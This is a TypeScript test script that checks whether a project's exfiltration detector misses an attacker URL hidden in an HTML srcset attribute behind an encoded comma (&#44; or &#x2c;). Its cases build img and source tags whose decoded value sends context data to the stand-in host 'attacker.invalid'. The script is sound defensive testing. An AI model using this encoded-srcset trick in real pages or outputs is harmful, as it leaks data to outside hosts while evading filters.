// T72 — the srcset candidate split, done properly.
//
// CAVEAT recorded rather than hidden: Bun's HTMLRewriter (lol-html) returns the
// RAW attribute source, not the tokenizer's decoded value — measured in
// T72-extra.log (`getAttribute("type")` on `type="&#105;mage"` returns
// `&#105;mage`). So it cannot serve as a DECODING oracle. The decoding premise
// used below is the one this module itself asserts three times and which T66,
// T71 and this review all accept: the HTML tokenizer consumes character
// references in the attribute-value states (§13.2.5.35-.39), so the srcset
// parser receives the DECODED value. Here that premise is applied explicitly and
// the resulting candidate list is compared with what the detector flags.
//
// Read-only, offline, synthetic hosts only. Usage: bun T72-srcset.ts
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "cdn.example.org";

// the tokenizer's numeric-reference decoding, applied to the attribute value
const decode = (v: string) =>
  v.replace(/&#(\d+);?/g, (_, d) => String.fromCodePoint(Number(d)))
   .replace(/&#[xX]([0-9a-fA-F]+);?/g, (_, h) => String.fromCodePoint(Number.parseInt(h, 16)));

// HTML "parse a srcset attribute": split on commas, take each candidate's
// leading non-whitespace run.
const candidates = (v: string) =>
  v.split(",").map((c) => c.trim().split(/\s+/)[0] ?? "").filter(Boolean);

const cases: Record<string, { text: string; value: string }> = {
  decimalComma: {
    text: `<img srcset="https://${OK}/a.png&#44;${U} 2x">`,
    value: `https://${OK}/a.png&#44;${U} 2x`,
  },
  hexComma: {
    text: `<img srcset="https://${OK}/a.png&#x2c;${U} 2x">`,
    value: `https://${OK}/a.png&#x2c;${U} 2x`,
  },
  sourceElement: {
    text: `<source srcset="https://${OK}/a.png&#44;${U} 2x">`,
    value: `https://${OK}/a.png&#44;${U} 2x`,
  },
};

for (const [id, c] of Object.entries(cases)) {
  const rendererCandidates = candidates(decode(c.value));
  const detectorRaw = candidates(c.value);
  for (const allowlist of [[] as string[], [OK]]) {
    const findings = detectExfil(c.text, allowlist);
    const flagged = findings.map((f) => String(f.value));
    console.log(
      `${id.padEnd(15)} allowlist=${JSON.stringify(allowlist).padEnd(20)} rendererCandidates=${JSON.stringify(rendererCandidates)} detectorCandidates=${JSON.stringify(detectorRaw)} flagged=${JSON.stringify(flagged)} verdict=${
        rendererCandidates.some((x) => x.includes(ATT)) && !flagged.some((v) => v.includes(ATT))
          ? "BYPASS"
          : "ok"
      }`,
    );
  }
}
